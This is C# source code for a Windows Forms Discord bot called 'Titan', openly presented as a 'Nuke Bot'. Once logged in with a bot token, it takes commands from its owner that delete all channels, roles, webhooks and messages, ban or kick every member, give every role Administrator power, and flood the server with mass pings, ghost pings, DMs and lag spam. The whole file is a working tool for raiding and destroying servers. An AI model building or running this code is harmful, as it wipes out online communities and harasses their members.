using MetroSuite;
using System.Diagnostics;
using System.Windows.Forms;
using Discord;
using Discord.WebSocket;
using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using Leaf.xNet;

public partial class MainForm : MetroForm
{
    public static DiscordSocketClient discordSocketClient;
    public static string trigger = "t!";
    public static ulong userId = 0U;

    public MainForm()
    {
        try
        {
            InitializeComponent();
            Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
            CheckForIllegalCrossThreadCalls = false;

            GC.Collect();
        }
        catch
        {
            Process.GetCurrentProcess().Kill();
            return;
        }
    }

    private void pictureBox24_Click(object sender, System.EventArgs e)
    {
        Process.GetCurrentProcess().Kill();
    }

    private void pictureBox22_Click(object sender, System.EventArgs e)
    {
        WindowState = FormWindowState.Minimized;
    }

    private void pictureBox24_MouseEnter(object sender, System.EventArgs e)
    {
        pictureBox24.Size = new System.Drawing.Size(18, 18);
    }

    private void pictureBox24_MouseLeave(object sender, System.EventArgs e)
    {
        pictureBox24.Size = new System.Drawing.Size(20, 20);
    }

    private void pictureBox22_MouseEnter(object sender, System.EventArgs e)
    {
        pictureBox22.Size = new System.Drawing.Size(18, 18);
    }

    private void pictureBox22_MouseLeave(object sender, System.EventArgs e)
    {
        pictureBox22.Size = new System.Drawing.Size(20, 20);
    }

    private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        Process.GetCurrentProcess().Kill();
    }

    private void metroButton1_Click(object sender, EventArgs e)
    {
        try
        {
            userId = ulong.Parse(metroTextbox2.Text);

            DiscordSocketConfig discordSocketConfig = new DiscordSocketConfig();
            discordSocketConfig.AlwaysDownloadUsers = true;
            discordSocketConfig.UdpSocketProvider = Discord.Net.Udp.DefaultUdpSocketProvider.Instance;
            discordSocketConfig.WebSocketProvider = Discord.Net.WebSockets.DefaultWebSocketProvider.Instance;
            discordSocketConfig.MessageCacheSize = 50;
            discordSocketClient = new DiscordSocketClient(discordSocketConfig);
            discordSocketClient.LoginAsync(TokenType.Bot, metroTextbox1.Text, true);
            discordSocketClient.StartAsync();
            discordSocketClient.SetStatusAsync(UserStatus.Online);
            discordSocketClient.SetGameAsync("I'm in the body of a Giant.", null, ActivityType.Playing);
            discordSocketClient.MessageReceived += DiscordSocketClient_MessageReceived;

            metroButton1.Enabled = false;
            metroButton2.Enabled = true;
        }
        catch
        {
            MessageBox.Show("Invalid Discord Bot token! Please, try again.", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private void metroButton2_Click(object sender, EventArgs e)
    {
        try
        {
            discordSocketClient.SetStatusAsync(UserStatus.Invisible);
            discordSocketClient.StopAsync();
            discordSocketClient.LogoutAsync();
            discordSocketClient.Dispose();
            discordSocketClient = null;

            metroButton2.Enabled = false;
            metroButton1.Enabled = true;
        }
        catch
        {
            MessageBox.Show("Failed to stop the Nuke Bot! Please, try again.", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    public static bool IsIDValid(string id)
    {
        try
        {
            if (id.Length != 18)
            {
                return false;
            }

            if (!Information.IsNumeric(id))
            {
                return false;
            }
        }
        catch
        {

        }

        return true;
    }

    private static async System.Threading.Tasks.Task DiscordSocketClient_MessageReceived(SocketMessage arg)
    {
        try
        {
            if (arg.Author.Id != userId)
            {
                return;
            }

            SocketGuildChannel currentChannel = (SocketGuildChannel)arg.Channel;
            ISocketMessageChannel channel = (ISocketMessageChannel)arg.Channel;
            SocketGuild guild = currentChannel.Guild;
            SocketTextChannel textChannel = guild.GetTextChannel(channel.Id);
            SocketGuildUser socketGuildUser = (SocketGuildUser)arg.Author;
            string textMessage = arg.Content;
            string lowerMessage = textMessage.ToLower();

            if (textMessage.StartsWith(trigger))
            {
                try
                {
                    await arg.DeleteAsync();
                }
                catch
                {

                }

                string cmd = textMessage.Substring(trigger.Length, textMessage.Length - trigger.Length);
                string cmdLower = cmd.ToLower();
                string[] args = { "" };
                string[] argsLower = { "" };

                if (cmd.Contains(" "))
                {
                    args = Strings.Split(cmd);
                    argsLower = Strings.Split(cmdLower);
                }

                if (cmd == "help")
                {
                    var embed = new EmbedBuilder();
                    embed.WithColor(new Color(230, 119, 20));
                    embed.WithTitle("🦍 Titan Commands ( Page 1 / 2 )");
                    embed.WithDescription(@"👋 Welcome to *Titan*, I will destroy everything I will see." + Environment.NewLine +
                        "❓ Here is the list of commands that this bot can do: " + Environment.NewLine + Environment.NewLine +
                        "📜 **" + trigger + "help** [page] - Get the list of all commands of Titan." + Environment.NewLine +
                        "💬 **" + trigger + "text** <num> <name> - Add the specified amount of text channels." + Environment.NewLine +
                        "📌 **" + trigger + "category** <num> <name> - Add the specified amount of categories." + Environment.NewLine +
                        "🔊 **" + trigger + "voice** <num> <name> - Add the specified amount of voice channels." + Environment.NewLine +
                        "⛔ **" + trigger + "deltxt** - Delete all text channels." + Environment.NewLine +
                        "⛔ **" + trigger + "delvc** - Delete all voice channels." + Environment.NewLine +
                        "⛔ **" + trigger + "delcat** - Delete all categories." + Environment.NewLine +
                        "📜 **" + trigger + "servername** <name> - Change the server name." + Environment.NewLine +
                        "🌐 **" + trigger + "topic** <topic> - Change the topic to all text channels." + Environment.NewLine +
                        "⛔ **" + trigger + "deltopic** - Delete the topic from all text channels." + Environment.NewLine +
                        "👮 **" + trigger + "role** <num> <name> - Add the specified amount of roles." + Environment.NewLine +
                        "⛔ **" + trigger + "delroles** - Delete all roles." + Environment.NewLine +
                        "📱 **" + trigger + "icon** - Set the server icon to the Titan icon." + Environment.NewLine +
                        "⛔ **" + trigger + "delchannels** - Delete all channels." + Environment.NewLine +
                        "⛔ **" + trigger + "delall** - Delete all channels and all roles." + Environment.NewLine +
                        "☠️ **" + trigger + "kickall** [reason] - Kick all users from the server. (Reason is not obligatory)" + Environment.NewLine +
                        "💀 **" + trigger + "banall** [reason] - Ban all users from the server. (Reason is not obligatory)" + Environment.NewLine +
                        "😃 **" + trigger + "unbanall** - Unban all users from the server." + Environment.NewLine +
                        "☢️ **" + trigger + "nuke** - Nuke the server. Delete all channels and all roles, change server icon and server name, create mass roles and mass text channels." + Environment.NewLine +
                        "🔔 **" + trigger + "pings** <num> - Send the specified number of pings in chat." + Environment.NewLine +
                        "👻 **" + trigger + "ghostpings** <num> - Send the specified number of ghost pings." + Environment.NewLine +
                        "🎈 **" + trigger + "msgspam** <num> <msg> - Spam the specified message in chat." + Environment.NewLine +
                        "🌎 **" + trigger + "massmsg** <num> <msg> - Spam the specified message in all chats." + Environment.NewLine +
                        "💻 **" + trigger + "lag** <num> - Spam lag messages in all chats." + Environment.NewLine +
                        "😶 **" + trigger + "emojispam** <num> - Spam emoji lag messages in all chats." + Environment.NewLine +
                        "🏷 **" + trigger + "nick** <nick> - Set the same nick name to all users." + Environment.NewLine +
                        "💬 **" + trigger + "dm** <message> - Send a message in DM to all users." + Environment.NewLine +
                        "👑 **" + trigger + "admin** - Get a role with Administrator permissions." + Environment.NewLine +
                        "⭐ **" + trigger + "superspam** <num> - Send a big message in all chats.");

                    await arg.Author.SendMessageAsync("", false, embed.Build());
                }
                else if (cmd.StartsWith("help "))
                {
                    int num = int.Parse(args[1]);
                    int pageLimit = 2;

                    if (num > pageLimit)
                    {
                        num = pageLimit;
                    }

                    if (num < 1)
                    {
                        num = 1;
                    }

                    var embed = new EmbedBuilder();
                    embed.WithColor(new Color(230, 119, 20));
                    embed.WithTitle("🦍 Titan Commands ( Page " + num.ToString() + " / " + pageLimit + " )");

                    if (num == 1)
                    {
                        embed.WithDescription(@"👋 Welcome to *Titan*, I will destroy everything I will see." + Environment.NewLine +
                            "❓ Here is the list of commands that this bot can do: " + Environment.NewLine + Environment.NewLine +
                            "📜 **" + trigger + "help** [page] - Get the list of all commands of Titan." + Environment.NewLine +
                            "💬 **" + trigger + "text** <num> <name> - Add the specified amount of text channels." + Environment.NewLine +
                            "📌 **" + trigger + "category** <num> <name> - Add the specified amount of categories." + Environment.NewLine +
                            "🔊 **" + trigger + "voice** <num> <name> - Add the specified amount of voice channels." + Environment.NewLine +
                            "⛔ **" + trigger + "deltxt** - Delete all text channels." + Environment.NewLine +
                            "⛔ **" + trigger + "delvc** - Delete all voice channels." + Environment.NewLine +
                            "⛔ **" + trigger + "delcat** - Delete all categories." + Environment.NewLine +
                            "📜 **" + trigger + "servername** <name> - Change the server name." + Environment.NewLine +
                            "🌐 **" + trigger + "topic** <topic> - Change the topic to all text channels." + Environment.NewLine +
                            "⛔ **" + trigger + "deltopic** - Delete the topic from all text channels." + Environment.NewLine +
                            "👮 **" + trigger + "role** <num> <name> - Add the specified amount of roles." + Environment.NewLine +
                            "⛔ **" + trigger + "delroles** - Delete all roles." + Environment.NewLine +
                            "📱 **" + trigger + "icon** - Set the server icon to the Titan icon." + Environment.NewLine +
                            "⛔ **" + trigger + "delchannels** - Delete all channels." + Environment.NewLine +
                            "⛔ **" + trigger + "delall** - Delete all channels and all roles." + Environment.NewLine +
                            "☠️ **" + trigger + "kickall** [reason] - Kick all users from the server. (Reason is not obligatory)" + Environment.NewLine +
                            "💀 **" + trigger + "banall** [reason] - Ban all users from the server. (Reason is not obligatory)" + Environment.NewLine +
                            "😃 **" + trigger + "unbanall** - Unban all users from the server." + Environment.NewLine +
                            "☢️ **" + trigger + "nuke** - Nuke the server. Delete all channels and all roles, change server icon and server name, create mass roles and mass text channels." + Environment.NewLine +
                            "🔔 **" + trigger + "pings** <num> - Send the specified number of pings in chat." + Environment.NewLine +
                            "👻 **" + trigger + "ghostpings** <num> - Send the specified number of ghost pings." + Environment.NewLine +
                            "🎈 **" + trigger + "msgspam** <num> <msg> - Spam the specified message in chat." + Environment.NewLine +
                            "🌎 **" + trigger + "massmsg** <num> <msg> - Spam the specified message in all chats." + Environment.NewLine +
                            "💻 **" + trigger + "lag** <num> - Spam lag messages in all chats." + Environment.NewLine +
                            "😶 **" + trigger + "emojispam** <num> - Spam emoji lag messages in all chats." + Environment.NewLine +
                            "🏷 **" + trigger + "nick** <nick> - Set the same nick name to all users." + Environment.NewLine +
                            "💬 **" + trigger + "dm** <message> - Send a message in DM to all users." + Environment.NewLine +
                            "👑 **" + trigger + "admin** - Get a role with Administrator permissions." + Environment.NewLine +
                            "⭐ **" + trigger + "superspam** <num> - Send a big message in all chats.");
                    }
                    else if (num == pageLimit)
                    {
                        embed.WithDescription(@"👋 Welcome to *Titan*, I will destroy everything I will see." + Environment.NewLine +
                            "❓ Here is the list of commands that this bot can do: " + Environment.NewLine + Environment.NewLine +
                            "📜 **" + trigger + "help** [page] - Get the list of all commands of Titan." + Environment.NewLine +
                            "🚚 **" + trigger + "moveall** - Moves all users in different voice channels to a unique voice channel." + Environment.NewLine +
                            "🚪 **" + trigger + "disconnectall** - Disconnect all users connected to different voice channels." + Environment.NewLine +
                            "📍 **" + trigger + "pingroles** <num> - Ping all roles in the same chat." + Environment.NewLine +
                            "🕸 **" + trigger + "delwebhooks** - Delete all webhooks in the channel." + Environment.NewLine +
                            "🌐 **" + trigger + "delallwebhooks** - Delete all webhooks in all text channels." + Environment.NewLine +
                            "🎃 **" + trigger + "addroles** - Gives all roles of the servers to every server user." + Environment.NewLine +
                            "🦷 **" + trigger + "removeroles** - Remove all roles of the servers to every server user." + Environment.NewLine +
                            "📝 **" + trigger + "delmessages** - Delete all messages in the current text channel." + Environment.NewLine +
                            "📃 **" + trigger + "delallmessages** - Delete all messages in all text channels of the server." + Environment.NewLine +
                            "🔓 **" + trigger + "unlimit** - Remove the user limit from all voice channels." + Environment.NewLine +
                            "🔐 **" + trigger + "limit** <num> - Set a limit of user in all voice channels." + Environment.NewLine +
                            "✨ **" + trigger + "alladmin** - Set the Administrator power to all roles of the server.");
                    }

                    await arg.Author.SendMessageAsync("", false, embed.Build());
                }
                else if (cmd == "delallmessages")
                {
                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        try
                        {
                            var messages = await socketTextChannel.GetMessagesAsync(100).FlattenAsync();
                            await socketTextChannel.DeleteMessagesAsync(messages);
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd == "delmessages")
                {
                    var messages = await channel.GetMessagesAsync(100).FlattenAsync();
                    await textChannel.DeleteMessagesAsync(messages);
                }
                else if (cmd == "unlimit")
                {
                    foreach (SocketVoiceChannel voiceChannel in guild.VoiceChannels)
                    {
                        try
                        {
                            await voiceChannel.ModifyAsync(x =>
                            {
                                x.UserLimit = null;
                            });
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd.StartsWith("limit "))
                {
                    int num = int.Parse(args[1]);

                    if (num < 1)
                    {
                        num = 1;
                    }

                    if (num > 99)
                    {
                        num = 99;
                    }

                    foreach (SocketVoiceChannel voiceChannel in guild.VoiceChannels)
                    {
                        try
                        {
                            await voiceChannel.ModifyAsync(x =>
                            {
                                x.UserLimit = num;
                            });
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd == "alladmin")
                {
                    foreach (SocketRole role in guild.Roles)
                    {
                        try
                        {
                            role.Permissions.Modify(null, null, null, null, true);
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd == "removeroles")
                {
                    List<ulong> roles = new List<ulong>();

                    foreach (SocketRole role in guild.Roles)
                    {
                        try
                        {
                            roles.Add(role.Id);
                        }
                        catch
                        {

                        }
                    }

                    await guild.DownloadUsersAsync();

                    foreach (SocketGuildUser user in guild.Users)
                    {
                        try
                        {
                            foreach (ulong role in roles)
                            {
                                try
                                {
                                    await user.RemoveRoleAsync(guild.GetRole(role));
                                }
                                catch
                                {

                                }
                            }
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd == "addroles")
                {
                    List<ulong> roles = new List<ulong>();
                    
                    foreach (SocketRole role in guild.Roles)
                    {
                        try
                        {
                            roles.Add(role.Id);
                        }
                        catch
                        {

                        }
                    }

                    await guild.DownloadUsersAsync();

                    foreach (SocketGuildUser user in guild.Users)
                    {
                        try
                        {
                            foreach (ulong role in roles)
                            {
                                try
                                {
                                    await user.AddRoleAsync(guild.GetRole(role));
                                }
                                catch
                                {

                                }
                            }
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd == "delwebhooks")
                {
                    foreach (Discord.Rest.RestWebhook webhook in guild.GetWebhooksAsync().GetAwaiter().GetResult())
                    {
                        try
                        {
                            if (webhook.ChannelId == textChannel.Id)
                            {
                                await webhook.DeleteAsync();
                            }                 
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd == "delallwebhooks")
                {
                    foreach (Discord.Rest.RestWebhook webhook in guild.GetWebhooksAsync().GetAwaiter().GetResult())
                    {
                        try
                        {
                            await webhook.DeleteAsync();
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd.StartsWith("pingroles "))
                {
                    int num = int.Parse(args[1]);
                    string preparedMessage = "";

                    try
                    {
                        foreach (SocketRole role in guild.Roles)
                        {
                            try
                            {
                                if (preparedMessage == "")
                                {
                                    preparedMessage = "<@&" + role.Id.ToString() + ">";
                                }
                                else
                                {
                                    preparedMessage += " <@&" + role.Id.ToString() + ">";
                                }
                            }
                            catch
                            {

                            }
                        }
                    }
                    catch
                    {

                    }

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => sendMessage(textChannel, preparedMessage)).Start();
                    }
                }
                else if (cmd.StartsWith("text "))
                {
                    int num = int.Parse(args[1]);
                    string name = cmd.Replace("text " + num.ToString() + " ", "");

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => createTextChannel(guild, name)).Start();
                    }
                }
                else if (cmd.StartsWith("voice "))
                {
                    int num = int.Parse(args[1]);
                    string name = cmd.Replace("voice " + num.ToString() + " ", "");

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => createVoiceChannel(guild, name)).Start();
                    }
                }
                else if (cmd == "deltxt")
                {
                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        new Thread(() => deleteTextChannel(socketTextChannel)).Start();
                    }
                }
                else if (cmd == "delvc")
                {
                    foreach (SocketVoiceChannel socketVoiceChannel in guild.VoiceChannels)
                    {
                        new Thread(() => deleteVoiceChannel(socketVoiceChannel)).Start();
                    }
                }
                else if (cmd == "delcat")
                {
                    foreach (SocketCategoryChannel socketCategoryChannel in guild.CategoryChannels)
                    {
                        new Thread(() => deleteCategoryChannel(socketCategoryChannel)).Start();
                    }
                }
                else if (cmd.StartsWith("category "))
                {
                    int num = int.Parse(args[1]);
                    string name = cmd.Replace("category " + num.ToString() + " ", "");

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => createCategoryChannel(guild, name)).Start();
                    }
                }
                else if (cmd.StartsWith("servername "))
                {
                    string name = cmd.Substring(11, cmd.Length - 11);

                    await guild.ModifyAsync(x =>
                    {
                        x.Name = name;
                    });
                }
                else if (cmd == "deltopic")
                {
                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        new Thread(() => changeTopic(socketTextChannel, "")).Start();
                    }
                }
                else if (cmd.StartsWith("topic "))
                {
                    string topic = cmd.Substring(6, cmd.Length - 6);

                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        new Thread(() => changeTopic(socketTextChannel, topic)).Start();
                    }
                }
                else if (cmd.StartsWith("role "))
                {
                    int num = int.Parse(args[1]);
                    string name = cmd.Replace("role " + num.ToString() + " ", "");

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => createRole(guild, name)).Start();
                    }
                }
                else if (cmd == "delroles")
                {
                    foreach (SocketRole socketRole in guild.Roles)
                    {
                        try
                        {
                            new Thread(() => deleteRole(socketRole)).Start();
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                else if (cmd == "icon")
                {
                    await guild.ModifyAsync(x =>
                    {
                        x.Icon = new Image("server.png");
                    });
                }
                else if (cmd == "delchannels")
                {
                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        new Thread(() => deleteTextChannel(socketTextChannel)).Start();
                    }

                    foreach (SocketVoiceChannel socketVoiceChannel in guild.VoiceChannels)
                    {
                        new Thread(() => deleteVoiceChannel(socketVoiceChannel)).Start();
                    }

                    foreach (SocketCategoryChannel socketCategoryChannel in guild.CategoryChannels)
                    {
                        new Thread(() => deleteCategoryChannel(socketCategoryChannel)).Start();
                    }
                }
                else if (cmd == "delall")
                {
                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        new Thread(() => deleteTextChannel(socketTextChannel)).Start();
                    }

                    foreach (SocketVoiceChannel socketVoiceChannel in guild.VoiceChannels)
                    {
                        new Thread(() => deleteVoiceChannel(socketVoiceChannel)).Start();
                    }

                    foreach (SocketCategoryChannel socketCategoryChannel in guild.CategoryChannels)
                    {
                        new Thread(() => deleteCategoryChannel(socketCategoryChannel)).Start();
                    }

                    foreach (SocketRole socketRole in guild.Roles)
                    {
                        try
                        {
                            new Thread(() => deleteRole(socketRole)).Start();
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd == "kickall")
                {
                    foreach (SocketGuildUser user in guild.Users)
                    {
                        new Thread(() => kickUser(user)).Start();
                    }
                }
                else if (cmd == "banall")
                {
                    await guild.DownloadUsersAsync();

                    foreach (SocketGuildUser user in guild.Users)
                    {
                        new Thread(() => banUser(user)).Start();
                    }
                }
                else if (cmd == "unbanall")
                {
                    foreach (Discord.Rest.RestBan restBan in guild.GetBansAsync().Result)
                    {
                        new Thread(() => removeBan(guild, restBan)).Start();
                    }
                }
                else if (cmd.StartsWith("kickall "))
                {
                    string reason = cmd.Substring(8, cmd.Length - 8);

                    foreach (SocketGuildUser user in guild.Users)
                    {
                        new Thread(() => kickUser(user, reason)).Start();
                    }
                }
                else if (cmd.StartsWith("banall "))
                {
                    await guild.DownloadUsersAsync();
                    string reason = cmd.Substring(7, cmd.Length - 7);

                    foreach (SocketGuildUser user in guild.Users)
                    {
                        new Thread(() => banUser(user, reason)).Start();
                    }
                }
                else if (cmd.StartsWith("nick "))
                {
                    await guild.DownloadUsersAsync();
                    string nickname = cmd.Substring(5, cmd.Length - 5);

                    foreach (SocketGuildUser user in guild.Users)
                    {
                        new Thread(() => setNickname(user, nickname)).Start();
                    }
                }
                else if (cmd == "admin")
                {
                    GuildPermissions all = GuildPermissions.All;
                    Discord.Rest.RestRole role = guild.CreateRoleAsync("*", new GuildPermissions?(all), null, false, null).Result;

                    await socketGuildUser.AddRoleAsync(role);
                }
                else if (cmd.StartsWith("dm "))
                {
                    await guild.DownloadUsersAsync();
                    string msg = cmd.Substring(3, cmd.Length - 3);

                    foreach (SocketGuildUser guildUser in guild.Users)
                    {
                        try
                        {
                            new Thread(() => sendMsgUser(guildUser, msg)).Start();
                        }
                        catch
                        {

                        }
                    }
                }
                else if (cmd.StartsWith("pings "))
                {
                    int num = int.Parse(args[1]);

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => sendMessage(textChannel, "@everyone @here")).Start();
                    }
                }
                else if (cmd.StartsWith("ghostpings "))
                {
                    int num = int.Parse(args[1]);

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => ghostPing(textChannel)).Start();
                    }
                }
                else if (cmd.StartsWith("msgspam "))
                {
                    int num = int.Parse(args[1]);
                    string msg = cmd.Replace("msgspam " + num.ToString() + " ", "");

                    for (int i = 0; i < num; i++)
                    {
                        new Thread(() => sendMessage(textChannel, msg)).Start();
                    }
                }
                else if (cmd.StartsWith("massmsg "))
                {
                    int num = int.Parse(args[1]);
                    string msg = cmd.Replace("massmsg " + num.ToString() + " ", "");

                    for (int i = 0; i < num; i++)
                    {
                        foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                        {
                            new Thread(() => sendMessage(socketTextChannel, msg)).Start();
                        }
                    }
                }
                else if (cmd.StartsWith("emojispam "))
                {
                    int num = int.Parse(args[1]);

                    for (int i = 0; i < num; i++)
                    {
                        foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                        {
                            new Thread(() => sendMessage(socketTextChannel, ":face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph: :face_with_symbols_over_mouth::partying_face: :partying_face: :exploding_head: :space_invader: :face_vomiting: :cold_face: :triumph:")).Start();
                        }
                    }
                }
                else if (cmd.StartsWith("lag "))
                {
                    int num = int.Parse(args[1]);

                    for (int i = 0; i < num; i++)
                    {
                        foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                        {
                            new Thread(() => sendMessage(socketTextChannel, Utils.GetLagMessage())).Start();
                        }
                    }
                }
                else if (cmd.StartsWith("superspam "))
                {
                    int num = int.Parse(args[1]);
                    string completeMessage = "@everyone @here" + Environment.NewLine;

                    for (int i = 0; i < 30; i++)
                    {
                        completeMessage += Environment.NewLine + "🗽 **I WANT THE FREEDOM! I AM IN THE BODY OF A GIANT.**";
                    }

                    completeMessage += Environment.NewLine + Environment.NewLine + "https://i.imgur.com/8zcY0co.jpg";

                    for (int i = 0; i < num; i++)
                    {
                        foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                        {
                            new Thread(() => sendMessage(socketTextChannel, completeMessage)).Start();
                        }
                    }
                }
                else if (cmd == "nuke")
                {
                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        new Thread(() => deleteTextChannel(socketTextChannel)).Start();
                    }

                    foreach (SocketVoiceChannel socketVoiceChannel in guild.VoiceChannels)
                    {
                        new Thread(() => deleteVoiceChannel(socketVoiceChannel)).Start();
                    }

                    foreach (SocketCategoryChannel socketCategoryChannel in guild.CategoryChannels)
                    {
                        new Thread(() => deleteCategoryChannel(socketCategoryChannel)).Start();
                    }

                    foreach (SocketRole socketRole in guild.Roles)
                    {
                        try
                        {
                            new Thread(() => deleteRole(socketRole)).Start();
                        }
                        catch
                        {

                        }
                    }

                    await guild.ModifyAsync(x =>
                    {
                        x.Icon = new Image("server.png");
                        x.Name = "☢️ DESTROYED BY A TITAN";
                    });

                    for (int i = 0; i < 250; i++)
                    {
                        new Thread(() => createTextChannel(guild, "🔱-i-destroy-everything")).Start();
                    }

                    for (int i = 0; i < 250; i++)
                    {
                        new Thread(() => createRole(guild, "😡 I HATE HUMANS")).Start();
                    }
                }
                else if (cmd == "moveall")
                {
                    ulong newChannelId = guild.CreateVoiceChannelAsync("😡 I HATE HUMANS").GetAwaiter().GetResult().Id;

                    foreach (SocketVoiceChannel voiceChannel in guild.VoiceChannels)
                    {
                        new Thread(() => processMoveVoiceChannel(voiceChannel, newChannelId)).Start();
                    }
                }
                else if (cmd == "disconnectall")
                {
                    foreach (SocketVoiceChannel voiceChannel in guild.VoiceChannels)
                    {
                        new Thread(() => processDisconnectVoiceChannel(voiceChannel)).Start();
                    }
                }
            }
        }
        catch
        {

        }
    }

    public static void processDisconnectVoiceChannel(SocketVoiceChannel channel)
    {
        try
        {
            foreach (SocketGuildUser user in channel.Users)
            {
                try
                {
                    user.ModifyAsync(x =>
                    {
                        x.Channel = null;
                    });
                }
                catch
                {

                }
            }
        }
        catch
        {

        }
    }

    public static void processMoveVoiceChannel(SocketVoiceChannel channel, ulong channelId)
    {
        try
        {
            foreach (SocketGuildUser user in channel.Users)
            {
                try
                {
                    user.ModifyAsync(x =>
                    {
                        x.ChannelId = channelId;
                    });
                }
                catch
                {

                }
            }
        }
        catch
        {

        }
    }

    public static void createTextChannel(SocketGuild guild, string name)
    {
        try
        {
            guild.CreateTextChannelAsync(name);
        }
        catch
        {

        }
    }

    public static void createVoiceChannel(SocketGuild guild, string name)
    {
        try
        {
            guild.CreateVoiceChannelAsync(name);
        }
        catch
        {

        }
    }

    public static void deleteTextChannel(SocketTextChannel socketTextChannel)
    {
        try
        {
            socketTextChannel.DeleteAsync();
        }
        catch
        {

        }
    }

    public static void deleteVoiceChannel(SocketVoiceChannel socketVoiceChannel)
    {
        try
        {
            socketVoiceChannel.DeleteAsync();
        }
        catch
        {

        }
    }

    public static void deleteCategoryChannel(SocketCategoryChannel socketCategoryChannel)
    {
        try
        {
            socketCategoryChannel.DeleteAsync();
        }
        catch
        {

        }
    }

    public static void createCategoryChannel(SocketGuild guild, string name)
    {
        try
        {
            guild.CreateCategoryChannelAsync(name);
        }
        catch
        {

        }
    }

    public static void changeTopic(SocketTextChannel socketTextChannel, string topic)
    {
        try
        {
            socketTextChannel.ModifyAsync(x =>
            {
                x.Topic = topic;
            });
        }
        catch
        {

        }
    }

    public static void createRole(SocketGuild guild, string name)
    {
        try
        {
            guild.CreateRoleAsync(name, null, null, false, null);
        }
        catch
        {

        }
    }

    public static void deleteRole(SocketRole socketRole)
    {
        try
        {
            socketRole.DeleteAsync();
        }
        catch
        {

        }
    }

    public static void sendMessage(SocketTextChannel socketTextChannel, string message)
    {
        try
        {
            socketTextChannel.SendMessageAsync(message);
        }
        catch
        {

        }
    }

    public static void banUser(SocketGuildUser socketGuildUser)
    {
        try
        {
            socketGuildUser.BanAsync(7);
        }
        catch
        {

        }
    }

    public static void kickUser(SocketGuildUser socketGuildUser)
    {
        try
        {
            socketGuildUser.KickAsync();
        }
        catch
        {

        }
    }

    public static void removeBan(SocketGuild guild, Discord.Rest.RestBan ban)
    {
        try
        {
            guild.RemoveBanAsync(ban.User);
        }
        catch
        {

        }
    }

    public static void setNickname(SocketGuildUser socketGuildUser, string nickname)
    {
        try
        {
            socketGuildUser.ModifyAsync(x =>
            {
                x.Nickname = nickname;
            });
        }
        catch
        {

        }
    }

    public static void banUser(SocketGuildUser socketGuildUser, string reason)
    {
        try
        {
            socketGuildUser.BanAsync(7, reason);
        }
        catch
        {

        }
    }

    public static void kickUser(SocketGuildUser socketGuildUser, string reason)
    {
        try
        {
            socketGuildUser.KickAsync(reason);
        }
        catch
        {

        }
    }

    public static void ghostPing(SocketTextChannel socketTextChannel)
    {
        try
        {
            Discord.Rest.RestUserMessage message = socketTextChannel.SendMessageAsync("@everyone @here").Result;
            message.DeleteAsync();
        }
        catch
        {

        }
    }

    public static void sendMsgUser(SocketGuildUser socketGuildUser, string msg)
    {
        try
        {
            socketGuildUser.SendMessageAsync(msg);
        }
        catch
        {

        }
    }
}